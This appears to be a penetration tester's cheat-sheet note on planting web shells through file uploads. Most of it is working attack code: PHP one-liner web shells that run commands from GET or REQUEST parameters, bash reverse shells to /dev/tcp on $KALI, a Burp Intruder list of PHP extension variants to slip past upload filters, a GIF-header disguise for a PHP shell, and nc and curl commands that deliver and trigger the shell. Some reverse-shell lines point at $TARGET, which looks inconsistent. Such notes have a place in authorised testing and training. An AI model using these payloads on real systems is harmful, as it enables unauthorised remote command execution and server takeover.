
### asp, aspx, cfm, jsp, laudanum, perl, php

![[Pasted image 20220202133058.png]]

```bash - kali
cp /usr/share/webshells/
```


### Bypassing extension limits.
1. Capture and upload in Burp. 
2. Send to Intruder.
3. Dicitonary attack the extension (PHP example below).

```burpsuite - kali
php
php3
php4
php5
phtml
```

### PHP

#### wwolf

```bash - kali
wget https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php
```

![[Python#Server]]


#### php reverse shell payload

If you see php payload in exploit, replace with the following for reverse shell:

ORIGINAL:

```
payload = '<?php if($_POST["password"]=="' + password + '"){eval($_POST["cmd"]);}else{echo "<title>404 Not Found</title><h1>Not Found</h1>";}?>'
```

REPLACE WITH:
```php
payload = '<?php passthru("bash -i >& /dev/tcp/$KALI/80 0>&1"); ?>'
```

![[rlwrap]]


#### Pentestmonkey

```bash - kali
cp /usr/share/webshells/php/php-reverse-shell.php ./Shelly.php
```

https://github.com/pascal-gujer/webshellz

#### File upload webshells
Try saving this as 'Shelly.php' file, upload and access.

```php
<?php system($_GET[cmd]);?>
```

```php
<?php echo($_GET['cmd']);?>
```

```php
<?php echo shell_exec($_GET['cmd']);?>
```

![[rlwrap]]

```bash - target
bash+-c+'bash+-i+>%26+/dev/tcp/$KALI/443+0>%261'
```

```php
<?php exec("bash -c 'bash -i >& /dev/tcp/$TARGET/80 0>&1'");?>
```

#### GIF
Upload Shelly.php as a "GIF"

```
GIF8;
<?php echo system($_REQUEST['cmd']); ?>
```

#### File upload webshell

See also: [[5._File Upload]]

Set listener on port 4444 to output any connection to shelly.php.
```php
<?php echo exec('nc -lvnp 4444 > shelly.php 2>&1'); ?>.php
```

```php
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>
```

![[rlwrap]]

Upload and access Shelly.php.

```bash - kali
curl http://$TARGET/uploads/Shelly.php?cmd=id
```

Use nc to connect and transfer shelly.php.
```bash - kali
nc -nv IP 4444 < shelly.php
```

Visit file upload to connect reverse shell.

#### PHP reverse shell
Shelly.php
```php
<?php exec("bash -c 'bash -i >& /dev/tcp/$TARGET/80 0>&1'");?>
```

